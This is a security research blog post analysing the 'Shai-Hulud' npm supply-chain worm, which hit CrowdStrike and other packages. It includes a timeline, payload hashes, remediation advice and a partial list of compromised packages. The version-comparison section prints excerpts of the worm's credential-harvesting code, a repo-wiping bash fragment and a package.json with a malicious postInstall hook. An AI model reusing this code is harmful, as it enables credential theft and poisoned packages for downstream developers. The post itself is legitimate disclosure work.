---
date: '2025-09-23'
description: The ongoing "Shai-Hulud" supply chain attack has compromised multiple
  CrowdStrike npm packages, revisiting tactics that involve credential harvesting
  and unauthorized GitHub Actions workflows. Over 500 packages are affected, utilizing
  a malicious `bundle.js` that downloads TruffleHog to scan for secrets and exfiltrates
  data to a hardcoded webhook. Recent versions have enhanced stealth and propagation
  capabilities, eliminating checks that prevent redundant repository creations. Immediate
  remediation steps include uninstalling affected packages and rotating compromised
  credentials. This attack highlights the critical need for vigilance in dependency
  management and CI/CD environments.
link: https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages
tags:
- Cybersecurity News
- Supply Chain Attack
- Malware Exfiltration
- npm Packages
- Application Security
title: Updated and Ongoing Supply Chain Attack Targets CrowdStrike ...
---

[Back](https://socket.dev/blog)

Application SecurityResearchSecurity News

# Updated and Ongoing Supply Chain Attack Targets CrowdStrike npm Packages

## Socket detected multiple compromised CrowdStrike npm packages, continuing the "Shai-Hulud" supply chain attack that has now impacted nearly 500 packages.

![Updated and Ongoing Supply Chain Attack Targets CrowdStrike npm Packages  ](https://socket.dev/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F3740dba254a802cbd91562cb1a87b1215b2fea8c-3398x1324.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&w=3840&q=75)

![](https://cdn.sanity.io/images/cgdhsj6q/production/9bf6845e9d1dedb00c4d7156c0673ec97403c85c-512x512.jpg?w=100&q=95&fit=max&auto=format)

Kush Pandya

![](https://cdn.sanity.io/images/cgdhsj6q/production/49e516f793ecb5cb58cd7a6f9decb846ba73d27c-200x200.jpg?w=100&q=95&fit=max&auto=format)

Peter van der Zee

![](https://cdn.sanity.io/images/cgdhsj6q/production/0e3145f69c4fb40577f32d6893d2038ea469255b-200x200.png?w=100&q=95&fit=max&auto=format)

Olivia Brown

![](https://cdn.sanity.io/images/cgdhsj6q/production/8373d736d15f4a1508851aca61368cd44fd61ca5-400x400.jpg?w=100&q=95&fit=max&auto=format)

Socket Research Team

September 16, 2025

[Share on Twitter](https://www.twitter.com/intent/tweet?text=Updated%20and%20Ongoing%20Supply%20Chain%20Attack%20Targets%20CrowdStrike%20npm%20Packages%20%20%20https%3A%2F%2Fsocket.dev%2Fblog%2Fongoing-supply-chain-attack-targets-crowdstrike-npm-packages "Share on Twitter")[Share on LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fsocket.dev%2Fblog%2Fongoing-supply-chain-attack-targets-crowdstrike-npm-packages&title=Updated%20and%20Ongoing%20Supply%20Chain%20Attack%20Targets%20CrowdStrike%20npm%20Packages%20%20 "Share on LinkedIn")[Share on Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsocket.dev%2Fblog%2Fongoing-supply-chain-attack-targets-crowdstrike-npm-packages&quote=Updated%20and%20Ongoing%20Supply%20Chain%20Attack%20Targets%20CrowdStrike%20npm%20Packages%20%20 "Share on Facebook")[Subscribe with RSS](https://socket.dev/api/blog/feed.atom "Subscribe with RSS")

Multiple CrowdStrike npm packages published by the [`crowdstrike-publisher`](https://socket.dev/npm/user/crowdstrike-publisher) npm account were compromised. This looks like a continuation of the ongoing malicious supply chain campaign known as the “Shai-Hulud attack” that previously [compromised `tinycolor` and 40+ other packages](https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages). The malware is identical to this previous campaign, which includes a `bundle.js` script that:

- Downloads and executes TruffleHog, a legitimate secret scanner
- Searches host systems for tokens and cloud credentials
- Validates discovered developer and CI credentials
- Creates unauthorized GitHub Actions workflows within repositories
- Exfiltrates sensitive data to a hardcoded webhook endpoint

The affected packages were quickly removed by the npm registry. The malware includes a workflow file named `shai-hulud.yaml`, a nod to the sandworms in _Dune_. While not a unique reference, its presence reinforces that the attacker deliberately branded the campaign “Shai-Hulud.”

![ ](https://cdn.sanity.io/images/cgdhsj6q/production/2db338be421b4d2a7163f5690a64920a8365ab6a-1154x1322.png?w=1600&q=95&fit=max&auto=format)

In our previous analysis we found the payload writes a GitHub Actions workflow file named `shai-hulud-workflow.yml`. Around the same time, [nearly 700 public repositories titled **“** Shai-Hulud Migration **”**](https://github.com/search?type=repositories&q=Shai-Hulud+Migration&s=updated&o=desc) appeared on GitHub. While the precise role of these repos is still under investigation, their naming and timing suggest they may be artifacts of attacker automation used to persist or stage the workflow.

![ ](https://cdn.sanity.io/images/cgdhsj6q/production/62191d9d64365754b3ed6c66ac1ba77df12932b6-999x633.png?w=1600&q=95&fit=max&auto=format)

Our [previous post](https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages) has further details on the malware itself. The bash block uses a GitHub personal access token if present, writes a GitHub Actions workflow into **`.github/workflows`**, and exfiltrates collected content to a webhook.

The script combines local scanning with service specific probing. It looks for environment variables such as **`GITHUB_TOKEN`**, **`NPM_TOKEN`**, **`AWS_ACCESS_KEY_ID`**, and **`AWS_SECRET_ACCESS_KEY`**. It validates npm tokens with the **`whoami`** endpoint, and it interacts with GitHub APIs when a token is available. It also attempts cloud metadata discovery that can leak short lived credentials inside cloud build agents.

The workflow that it writes to repositories persists beyond the initial host. Once committed, any future CI run can trigger the exfiltration step from within the pipeline where sensitive secrets and artifacts are available by design.

## Timeline [\#](https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages\#Timeline)

All times are **npm publishing times** in 24-hour UTC.

### September 14, 2025

**17:58** first observed compromise

- `rxnt-authentication@0.0.3 (17:58:50)`
- `json-rules-engine-simplified@0.2.1 (17:58:51)`
- `react-jsonschema-form-conditionals@0.3.18 (17:58:52)`
- `encounter-playground@0.0.2 (17:58:52)`
- `rxnt-healthchecks-nestjs@1.0.2 (17:58:53)`
- `rxnt-kue@1.0.4 (17:58:54)`
- `react-complaint-image (17:58:02)` Hash for this batch: `de0e25a3e6c1e1e5998b306b7141b3dc4c0088da9d7bb47c1c00c91e6e4f85d6`

**18:35** small burst

Hash: `81d2a004a1bca6ef87a1caf7d0e0b355ad1764238e40ff6d1b1cb77ad4f595c3`

**20:29–20:45** first large burst (25+ packages and/or versions)

Hash: `83a650ce44b2a9854802a7fb4c202877815274c129af49e6c2d1d5d5d55c501e`

**21:01–21:03** burst (~17 packages and/or versions)

Hash: `4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db`

### September 15, 2025

**01:12** burst (~10 packages and/or versions)

Hash unchanged from 21:01 group: `4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db`

**02:11** new hash appears, reused across multiple bursts

Hash: `dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c`

Observed reuse at: 04:58, 05:21, 07:43, 08:21, 08:58, 09:16, 10:41, 13:14, and the next day at 07:41

Impact: more than 100 packages and/or versions across these bursts (especially at 09:16 and 10:41)

**15:35** new hash becomes active for the rest of the day

Hash: `46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09`

Bursts observed at: 19:52, 20:23, 22:35, 23:43

Impact: more than 50 packages and/or versions. This is the version that was originally covered in [our post on TinyColor](https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages).

### September 16, 2025

**01:14** first batch of the day (CrowdStrike set)

Hash: `b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777`

Impact: largest single burst, nearly 100 packages

**02:32** additional burst (~20 packages and/or versions)

Hash: `b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777`

**03:18** previous day’s hash returns

Hash: `46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09`

Impact: ~20 packages and/or versions at 03:18, ~10 around 05:32, ~60 between 06:17 and 07:11 (many under `@operato`)

**07:41** earlier hash from the 15th reappears

Hash: `dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c`

Impact: additional handful of packages and/or versions

**10:57–11:09** more `@operato` packages and/or versions

Hash: `46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09`

## Version Control [\#](https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages\#Version-Control)

The threat actor created 7 different versions of the worm, which we know because the worm has no ability to edit itself. There were multiple different seeder events as well as bursts of previous worms, as evidenced in the Timeline section.

### V1 v. V2

Difference between [version 1](https://socket.dev/npm/package/rxnt-authentication/files/0.0.3/bundle.js), `de0e25a3e6c1e1e5998b306b7141b3dc4c0088da9d7bb47c1c00c91e6e4f85d6`

```chakra-code css-n8z13r
ne.scanFilesystem()),{available:t,installed:ne.isInstalled(),version:r,platform:ne.getSupportedPlatform(),results:n}})()]);se=ce.npmUsername,ae=ce.npmTokenValid;const ue={application:t.getConfig(),system:{platform:r.platform,architecture:r.architecture,platformDetailed:r.platformRaw,architectureDetailed:r.archRaw},runtime:n,environment:process.env,modules:{github:{authenticated:F.isAuthenticated(),token:F.getCurrentToken()},aws:{valid:await te.getCallerIdentity(),secrets:await te.getAllSecretValues()},azure:{valid:await re.getProjectInfo(),secrets:await re.getAllSecretValues()},truffleHog:le,npm:{token:oe,authenticated:ae,username:se}}};if(F.isAuthenticated()&&!F.repoExists("Shai-Hulud")&&await F.makeRepo("Shai-Hulud",(0,_lib_utils__WEBPACK_IMPORTED_MODULE_1__.formatOutput)(ue)),F.isAuthenticated()&&((0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.isLinux)()||(0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.isMac)()))
```

and [version](https://socket.dev/npm/package/jumpgate/files/0.0.2/bundle.js) [2](https://socket.dev/npm/package/jumpgate/files/0.0.2/bundle.js),

`81d2a004a1bca6ef87a1caf7d0e0b355ad1764238e40ff6d1b1cb77ad4f595c3`:

```chakra-code css-n8z13r
ne.scanFilesystem()),{available:t,installed:ne.isInstalled(),version:r,platform:ne.getSupportedPlatform(),results:n}})()]);console.log("Configuring."),se=ce.npmUsername,ae=ce.npmTokenValid;let ue=[];await te.isValid()&&(ue=await te.getAllSecretValues());let de=[];await re.isValid()&&(de=await re.getAllSecretValues());const pe={application:t.getConfig(),system:{platform:r.platform,architecture:r.architecture,platformDetailed:r.platformRaw,architectureDetailed:r.archRaw},runtime:n,environment:process.env,modules:{github:{authenticated:F.isAuthenticated(),token:F.getCurrentToken()},aws:{secrets:ue},gcp:{secrets:de},truffleHog:le,npm:{token:oe,authenticated:ae,username:se}}};if(F.isAuthenticated()&&!F.repoExists("Shai-Hulud")&&await F.makeRepo("Shai-Hulud",(0,_lib_utils__WEBPACK_IMPORTED_MODULE_1__.formatOutput)(pe)),F.isAuthenticated()&&((0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.isLinux)()||(0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.isMac)()))
```

These lines implement automated reconnaissance and credential harvesting, then exfiltrate that collected data to a GitHub repo under the attacker’s control. They gather local system/runtime info and _cloud / credential-related data_, build an object containing that telemetry, and if a GitHub client `F` is authenticated and a repo named `"Shai-Hulud"` does not exist create that repo and pass the collected object to it. The exfiltration mechanism remains identical.

The new version adds a single log line, `Configuring`, likely for debugging purposes.

Next, the new version checks if the AWS credentials are valid before requesting secret values, likely to avoid throwing or failing when provider credentials are missing. It also now targets Google Cloud instead of Azure, and collects secrets into arrays rather than embedding a valid status. The second has improvements in the code overall, like establishing an empty array and then filling it conditionally to reduce exceptions on invalid clients.

### V2 v. V3

The difference between [version 2](https://socket.dev/npm/package/jumpgate/files/0.0.2/bundle.js), `81d2a004a1bca6ef87a1caf7d0e0b355ad1764238e40ff6d1b1cb77ad4f595c3`,

and [version 3](https://socket.dev/npm/package/@tnf-dev/api/files/1.0.8/bundle.js), `83a650ce44b2a9854802a7fb4c202877815274c129af49e6c2d1d5d5d55c501e` :

- Version 3 makes the code overall smoother and stealthier. Version three corrects race conditions and prevents double callbacks, and uses chaining to improve robustness. It also avoids throwing exceptions from cleanup by swallowing errors. The third version will kill long running scans 30 seconds earlier than version 2, and exits when the trufflehog binary is not available. It also removes the `Configuring` logging message.
- The GitHub token abuse happens earlier in the exploit, making the attack more reliable.

### V3 v. V4

There is only one difference between [version 3](https://socket.dev/npm/package/@tnf-dev/api/files/1.0.8/bundle.js), `83a650ce44b2a9854802a7fb4c202877815274c129af49e6c2d1d5d5d55c501e`, and [version 4](https://socket.dev/npm/package/eslint-config-teselagen/files/6.1.7/bundle.js), `4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db`. In Version 4, the tool attempts to iterate up to 20 packages of a single maintainer instead of 10 in one pass, accelerating the propagation.

### V4 v. V5

Between [Version 4](https://socket.dev/npm/package/eslint-config-teselagen/files/6.1.7/bundle.js), `4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db`, and [Version 5](https://socket.dev/npm/package/mstate-cli/files/0.4.7/bundle.js), `dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c`, the threat actor removes a check to see if the repo, Shai-Hulud already exists. Now, the repo is always created as long as the token is authenticated. This likely handles any race condition that may occur if multiple infected hosts run version 4 concurrently. Version 5 likely improves the yield, and removes one less API call, reducing obvious reconnaissance fingerprints in GitHub audit logs.

### V5 v. V6

[Version 5](https://socket.dev/npm/package/mstate-cli/files/0.4.7/bundle.js), `dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c`, and [Version 6,](https://socket.dev/npm/package/wdio-web-reporter/files/0.1.3/bundle.js) `46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09` have a few differences.

- Version 6 is more succinct overall. It reduces noise and acts more stealthily by removing helper logs and adding a skip switch on the filesystem scan, which is the loudest step of the campaign. It also renames some variables and now exfiltrates the GitHub username.

### V6 v. V7

Between [Version 6](https://socket.dev/npm/package/wdio-web-reporter/files/0.1.3/bundle.js), `46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09`, and [Version 7](https://socket.dev/npm/package/@operato/headroom/files/9.0.36/bundle.js), `b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777`, the threat actor only removes this:

```chakra-code css-n8z13r
# Convert to a regular repo temporarily to make changes\\n
git config --unset core.bare\\n
git reset --hard\\n\\n
# Remove .github/workflows directory if it exists and commit\\n    if [[ -d ".github/workflows" ]]; then\\n
rm -rf .github/workflows\\n
git add -A\\n
git commit -m "Remove GitHub workflows directory"\\n
fi\\n\\n
# Convert back to bare repo for mirroring\\n
git config core.bare true\\n
rm -rf *\\n\\n
```

Version 6 used both the bare-repo filesystem manipulation technique **and** workflow-creation/exfil logic present in the above snippet. Version 7 removed the filesystem ( `git config` / `rm -rf`) technique and retained the workflow/Actions + GitHub-API + webhook exfiltration behavior. This evasion is less noisy, and no longer leaves obvious forensic artifacts.

Throughout each of the versions, the actor tries to become stealthier and more efficient. Notably, there is no cryptowallet draining or obfuscation, which is different than the campaign [targeting `Nx` npm packages](https://socket.dev/blog/nx-packages-compromised) from a few weeks ago.

### Worm Behavior

The malware can self-propagate by automatically stealing credentials and then using those credentials to insert workflows into other repos. It automatically modifies and republishes packages as part of its propagation chain. However, it cannot self-propagate without those credentials, meaning eventually it will run out of credentials to steal from the packages it’s compromised.

Once it steals credentials and gains write and publish capabilities from those credentials, it obtains the target package artifact, unpacks the package, and then creates or replaces the package’s `bundle.js` file with its own malicious `bundle.js`. It also may edit the `package.json` file to add a postinstall script. Then it repacks the tarball and publishes the poisoned version. Now, when downstream users install the package, the malicious postinstall or injected `bundle.js` executes and can run the same discovery and publish code on the new host. Harvested credentials are used to target other repos and packages.

This is an example `package.json` from the first version, in `rxnt-authentication`:

```chakra-code css-n8z13r
{
  "name": "rxnt-authentication",
  "version": "0.0.3",
  "description": "Authentication helper methods for RXNT Authentication in Node APIs",
  "main": "dist/index.js",
  "types": "dist/indext.d.ts",
  "files": [\
    "src",\
    "dist"\
  ],
  "repository": {
    "type": "git",
    "url": "<https://github.com/RXNT/common.git>",
    "directory": "rxnt-authentication"
  },
  "scripts": {
    "build": "tsup src/index.ts --dts",
    "test": "jest",
    "format": "prettier --write src/**/*",
    "lint": "eslint src/**/*.{js,ts,json}",
    "increment-version": "node ../scripts/increment-version.script.js",
    "publish-package": "node ../scripts/publish.script.js",
    "postInstall": "node bundle.js"
  },
  "author": "",
  "license": "ISC",
  "devDependencies": {
    "@types/express": "^5.0.3",
    "@types/jest": "^30.0.0",
    "@types/jsonwebtoken": "^9.0.10",
    "@types/node": "^24.3.1",
    "jest": "^30.1.3",
    "typescript": "^5.9.2"
  },
  "dependencies": {
    "express": "^5.1.0",
    "jsonwebtoken": "^9.0.2"
  }
}

```

Clearly, there is a postInstall script, calling to `node bundle.js`.

The tarball injection ensures the malicious code is present in the artifact itself, and is harder to notice if downstream users just `npm install` the package. Adding a postinstall script in `package.json` ensures automatic execution during `npm install` even if the package’s normal runtime doesn’t import the injected file.

This also explains why certain hashes re-emerged. It may not be because the threat actor decided versions 5 and 6 were superior, but actually because those versions found other accounts to propagate through. The GitHub Actions workflows trigger on events, not continuously, which would explain the gaps in time between the bursts from the malware. This may indicate that we have not seen the last of this malware yet.

## Immediate Guidance [\#](https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages\#Immediate-Guidance)

- **Uninstall or pin to known-good versions** until patched releases are verified.
- **Audit environments** (CI/CD agents, developer laptops) that installed the affected versions for unauthorized publishes or credential theft.
- **Rotate npm tokens and other exposed secrets** if these packages were present on machines with publishing credentials.
- Monitor logs for unusual **`npm publish`** or package modification events.

## Indicators of Compromise [\#](https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages\#Indicators-of-Compromise)

### Compromised Packages and Versions

The following npm packages and versions have been confirmed as affected:

Total packages: 526

001. [@ahmedhfarag/ngx-perfect-scrollbar@20.0.20](https://socket.dev/npm/package/@ahmedhfarag/ngx-perfect-scrollbar/files/20.0.20/bundle.js)
002. [@ahmedhfarag/ngx-virtual-scroller@4.0.4](https://socket.dev/npm/package/@ahmedhfarag/ngx-virtual-scroller/files/4.0.4/bundle.js)
003. [@art-ws/common@2.0.28](https://socket.dev/npm/package/@art-ws/common/files/2.0.28/bundle.js)
004. [@art-ws/config-eslint@2.0.4](https://socket.dev/npm/package/@art-ws/config-eslint/files/2.0.4/bundle.js)
005. [@art-ws/config-eslint@2.0.5](https://socket.dev/npm/package/@art-ws/config-eslint/files/2.0.5/bundle.js)
006. [@art-ws/config-ts@2.0.7](https://socket.dev/npm/package/@art-ws/config-ts/files/2.0.7/bundle.js)
007. [@art-ws/config-ts@2.0.8](https://socket.dev/npm/package/@art-ws/config-ts/files/2.0.8/bundle.js)
008. [@art-ws/db-context@2.0.24](https://socket.dev/npm/package/@art-ws/db-context/files/2.0.24/bundle.js)
009. [@art-ws/di-node@2.0.13](https://socket.dev/npm/package/@art-ws/di-node/files/2.0.13/bundle.js)
010. [@art-ws/di@2.0.28](https://socket.dev/npm/package/@art-ws/di/files/2.0.28/bundle.js)
011. [@art-ws/di@2.0.32](https://socket.dev/npm/package/@art-ws/di/files/2.0.32/bundle.js)
012. [@art-ws/eslint@1.0.5](https://socket.dev/npm/package/@art-ws/eslint/files/1.0.5/bundle.js)
013. [@art-ws/eslint@1.0.6](https://socket.dev/npm/package/@art-ws/eslint/files/1.0.6/bundle.js)
014. [@art-ws/fastify-http-server@2.0.24](https://socket.dev/npm/package/@art-ws/fastify-http-server/files/2.0.24/bundle.js)
015. [@art-ws/fastify-http-server@2.0.27](https://socket.dev/npm/package/@art-ws/fastify-http-server/files/2.0.27/bundle.js)
016. [@art-ws/http-server@2.0.21](https://socket.dev/npm/package/@art-ws/http-server/files/2.0.21/bundle.js)
017. [@art-ws/http-server@2.0.25](https://socket.dev/npm/package/@art-ws/http-server/files/2.0.25/bundle.js)
018. [@art-ws/openapi@0.1.12](https://socket.dev/npm/package/@art-ws/openapi/files/0.1.12/bundle.js)
019. [@art-ws/openapi@0.1.9](https://socket.dev/npm/package/@art-ws/openapi/files/0.1.9/bundle.js)
020. [@art-ws/package-base@1.0.5](https://socket.dev/npm/package/@art-ws/package-base/files/1.0.5/bundle.js)
021. [@art-ws/package-base@1.0.6](https://socket.dev/npm/package/@art-ws/package-base/files/1.0.6/bundle.js)
022. [@art-ws/prettier@1.0.5](https://socket.dev/npm/package/@art-ws/prettier/files/1.0.5/bundle.js)
023. [@art-ws/prettier@1.0.6](https://socket.dev/npm/package/@art-ws/prettier/files/1.0.6/bundle.js)
024. [@art-ws/slf@2.0.15](https://socket.dev/npm/package/@art-ws/slf/files/2.0.15/bundle.js)
025. [@art-ws/slf@2.0.22](https://socket.dev/npm/package/@art-ws/slf/files/2.0.22/bundle.js)
026. [@art-ws/ssl-info@1.0.10](https://socket.dev/npm/package/@art-ws/ssl-info/files/1.0.10/bundle.js)
027. [@art-ws/ssl-info@1.0.9](https://socket.dev/npm/package/@art-ws/ssl-info/files/1.0.9/bundle.js)
028. [@art-ws/web-app@1.0.3](https://socket.dev/npm/package/@art-ws/web-app/files/1.0.3/bundle.js)
029. [@art-ws/web-app@1.0.4](https://socket.dev/npm/package/@art-ws/web-app/files/1.0.4/bundle.js)
030. [@crowdstrike/commitlint@8.1.1](https://socket.dev/npm/package/@crowdstrike/commitlint/files/8.1.1/bundle.js)
031. [@crowdstrike/commitlint@8.1.2](https://socket.dev/npm/package/@crowdstrike/commitlint/files/8.1.2/bundle.js)
032. [@crowdstrike/falcon-shoelace@0.4.1](https://socket.dev/npm/package/@crowdstrike/falcon-shoelace/files/0.4.1/bundle.js)
033. [@crowdstrike/falcon-shoelace@0.4.2](https://socket.dev/npm/package/@crowdstrike/falcon-shoelace/files/0.4.2/bundle.js)
034. [@crowdstrike/foundry-js@0.19.1](https://socket.dev/npm/package/@crowdstrike/foundry-js/files/0.19.1/bundle.js)
035. [@crowdstrike/foundry-js@0.19.2](https://socket.dev/npm/package/@crowdstrike/foundry-js/files/0.19.2/bundle.js)
036. [@crowdstrike/glide-core@0.34.2](https://socket.dev/npm/package/@crowdstrike/glide-core/files/0.34.2/bundle.js)
037. [@crowdstrike/glide-core@0.34.3](https://socket.dev/npm/package/@crowdstrike/glide-core/files/0.34.3/bundle.js)
038. [@crowdstrike/logscale-dashboard@1.205.1](https://socket.dev/npm/package/@crowdstrike/logscale-dashboard/files/1.205.1/bundle.js)
039. [@crowdstrike/logscale-dashboard@1.205.2](https://socket.dev/npm/package/@crowdstrike/logscale-dashboard/files/1.205.2/bundle.js)
040. [@crowdstrike/logscale-file-editor@1.205.1](https://socket.dev/npm/package/@crowdstrike/logscale-file-editor/files/1.205.1/bundle.js)
041. [@crowdstrike/logscale-file-editor@1.205.2](https://socket.dev/npm/package/@crowdstrike/logscale-file-editor/files/1.205.2/bundle.js)
042. [@crowdstrike/logscale-parser-edit@1.205.1](https://socket.dev/npm/package/@crowdstrike/logscale-parser-edit/files/1.205.1/bundle.js)
043. [@crowdstrike/logscale-parser-edit@1.205.2](https://socket.dev/npm/package/@crowdstrike/logscale-parser-edit/files/1.205.2/bundle.js)
044. [@crowdstrike/logscale-search@1.205.1](https://socket.dev/npm/package/@crowdstrike/logscale-search/files/1.205.1/bundle.js)
045. [@crowdstrike/logscale-search@1.205.2](https://socket.dev/npm/package/@crowdstrike/logscale-search/files/1.205.2/bundle.js)
046. [@crowdstrike/tailwind-toucan-base@5.0.1](https://socket.dev/npm/package/@crowdstrike/tailwind-toucan-base/files/5.0.1/bundle.js)
047. [@crowdstrike/tailwind-toucan-base@5.0.2](https://socket.dev/npm/package/@crowdstrike/tailwind-toucan-base/files/5.0.2/bundle.js)
048. [@ctrl/deluge@7.2.1](https://socket.dev/npm/package/@ctrl/deluge/files/7.2.1/bundle.js)
049. [@ctrl/deluge@7.2.2](https://socket.dev/npm/package/@ctrl/deluge/files/7.2.2/bundle.js)
050. [@ctrl/golang-template@1.4.2](https://socket.dev/npm/package/@ctrl/golang-template/files/1.4.2/bundle.js)
051. [@ctrl/golang-template@1.4.3](https://socket.dev/npm/package/@ctrl/golang-template/files/1.4.3/bundle.js)
052. [@ctrl/magnet-link@4.0.3](https://socket.dev/npm/package/@ctrl/magnet-link/files/4.0.3/bundle.js)
053. [@ctrl/magnet-link@4.0.4](https://socket.dev/npm/package/@ctrl/magnet-link/files/4.0.4/bundle.js)
054. [@ctrl/ngx-codemirror@7.0.1](https://socket.dev/npm/package/@ctrl/ngx-codemirror/files/7.0.1/bundle.js)
055. [@ctrl/ngx-codemirror@7.0.2](https://socket.dev/npm/package/@ctrl/ngx-codemirror/files/7.0.2/bundle.js)
056. [@ctrl/ngx-csv@6.0.1](https://socket.dev/npm/package/@ctrl/ngx-csv/files/6.0.1/bundle.js)
057. [@ctrl/ngx-csv@6.0.2](https://socket.dev/npm/package/@ctrl/ngx-csv/files/6.0.2/bundle.js)
058. [@ctrl/ngx-emoji-mart@9.2.1](https://socket.dev/npm/package/@ctrl/ngx-emoji-mart/files/9.2.1/bundle.js)
059. [@ctrl/ngx-emoji-mart@9.2.2](https://socket.dev/npm/package/@ctrl/ngx-emoji-mart/files/9.2.2/bundle.js)
060. [@ctrl/ngx-rightclick@4.0.1](https://socket.dev/npm/package/@ctrl/ngx-rightclick/files/4.0.1/bundle.js)
061. [@ctrl/ngx-rightclick@4.0.2](https://socket.dev/npm/package/@ctrl/ngx-rightclick/files/4.0.2/bundle.js)
062. [@ctrl/qbittorrent@9.7.1](https://socket.dev/npm/package/@ctrl/qbittorrent/files/9.7.1/bundle.js)
063. [@ctrl/qbittorrent@9.7.2](https://socket.dev/npm/package/@ctrl/qbittorrent/files/9.7.2/bundle.js)
064. [@ctrl/react-adsense@2.0.1](https://socket.dev/npm/package/@ctrl/react-adsense/files/2.0.1/bundle.js)
065. [@ctrl/react-adsense@2.0.2](https://socket.dev/npm/package/@ctrl/react-adsense/files/2.0.2/bundle.js)
066. [@ctrl/shared-torrent@6.3.1](https://socket.dev/npm/package/@ctrl/shared-torrent/files/6.3.1/bundle.js)
067. [@ctrl/shared-torrent@6.3.2](https://socket.dev/npm/package/@ctrl/shared-torrent/files/6.3.2/bundle.js)
068. [@ctrl/tinycolor@4.1.1](https://socket.dev/npm/package/@ctrl/tinycolor/files/4.1.1/bundle.js)
069. [@ctrl/tinycolor@4.1.2](https://socket.dev/npm/package/@ctrl/tinycolor/files/4.1.2/bundle.js)
070. [@ctrl/torrent-file@4.1.1](https://socket.dev/npm/package/@ctrl/torrent-file/files/4.1.1/bundle.js)
071. [@ctrl/torrent-file@4.1.2](https://socket.dev/npm/package/@ctrl/torrent-file/files/4.1.2/bundle.js)
072. [@ctrl/transmission@7.3.1](https://socket.dev/npm/package/@ctrl/transmission/files/7.3.1/bundle.js)
073. [@ctrl/ts-base32@4.0.1](https://socket.dev/npm/package/@ctrl/ts-base32/files/4.0.1/bundle.js)
074. [@ctrl/ts-base32@4.0.2](https://socket.dev/npm/package/@ctrl/ts-base32/files/4.0.2/bundle.js)
075. [@hestjs/core@0.2.1](https://socket.dev/npm/package/@hestjs/core/files/0.2.1/bundle.js)
076. [@hestjs/cqrs@0.1.6](https://socket.dev/npm/package/@hestjs/cqrs/files/0.1.6/bundle.js)
077. [@hestjs/demo@0.1.2](https://socket.dev/npm/package/@hestjs/demo/files/0.1.2/bundle.js)
078. [@hestjs/eslint-config@0.1.2](https://socket.dev/npm/package/@hestjs/eslint-config/files/0.1.2/bundle.js)
079. [@hestjs/logger@0.1.6](https://socket.dev/npm/package/@hestjs/logger/files/0.1.6/bundle.js)
080. [@hestjs/scalar@0.1.7](https://socket.dev/npm/package/@hestjs/scalar/files/0.1.7/bundle.js)
081. [@hestjs/validation@0.1.6](https://socket.dev/npm/package/@hestjs/validation/files/0.1.6/bundle.js)
082. [@nativescript-community/arraybuffers@1.1.6](https://socket.dev/npm/package/@nativescript-community/arraybuffers/files/1.1.6/bundle.js)
083. [@nativescript-community/arraybuffers@1.1.7](https://socket.dev/npm/package/@nativescript-community/arraybuffers/files/1.1.7/bundle.js)
084. [@nativescript-community/arraybuffers@1.1.8](https://socket.dev/npm/package/@nativescript-community/arraybuffers/files/1.1.8/bundle.js)
085. [@nativescript-community/gesturehandler@2.0.35](https://socket.dev/npm/package/@nativescript-community/gesturehandler/files/2.0.35/bundle.js)
086. [@nativescript-community/perms@3.0.5](https://socket.dev/npm/package/@nativescript-community/perms/files/3.0.5/bundle.js)
087. [@nativescript-community/perms@3.0.6](https://socket.dev/npm/package/@nativescript-community/perms/files/3.0.6/bundle.js)
088. [@nativescript-community/perms@3.0.7](https://socket.dev/npm/package/@nativescript-community/perms/files/3.0.7/bundle.js)
089. [@nativescript-community/perms@3.0.8](https://socket.dev/npm/package/@nativescript-community/perms/files/3.0.8/bundle.js)
090. [@nativescript-community/perms@3.0.9](https://socket.dev/npm/package/@nativescript-community/perms/files/3.0.9/bundle.js)
091. [@nativescript-community/sentry@4.6.43](https://socket.dev/npm/package/@nativescript-community/sentry/files/4.6.43/bundle.js)
092. [@nativescript-community/sqlite@3.5.2](https://socket.dev/npm/package/@nativescript-community/sqlite/files/3.5.2/bundle.js)
093. [@nativescript-community/sqlite@3.5.3](https://socket.dev/npm/package/@nativescript-community/sqlite/files/3.5.3/bundle.js)
094. [@nativescript-community/sqlite@3.5.4](https://socket.dev/npm/package/@nativescript-community/sqlite/files/3.5.4/bundle.js)
095. [@nativescript-community/sqlite@3.5.5](https://socket.dev/npm/package/@nativescript-community/sqlite/files/3.5.5/bundle.js)
096. [@nativescript-community/text@1.6.10](https://socket.dev/npm/package/@nativescript-community/text/files/1.6.10/bundle.js)
